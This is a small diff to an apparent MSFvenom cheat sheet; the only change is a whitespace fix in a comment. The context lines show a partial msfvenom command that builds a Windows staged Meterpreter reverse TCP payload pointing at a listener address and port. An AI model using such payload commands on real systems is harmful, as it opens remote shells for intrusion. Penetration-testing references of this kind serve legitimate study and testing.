@@ -85,7 +85,7 @@ MSFvenom payload names follow a predictable structure. Understanding it helps yo
 ### Reverse TCP (Staged & Stageless)
 
 ```bash
-# Staged (smaller initial size; pulls stage over socket) 
+# Staged (smaller initial size; pulls stage over socket)
 # x86 staged reverse TCP
 msfvenom -p windows/x86/meterpreter/reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
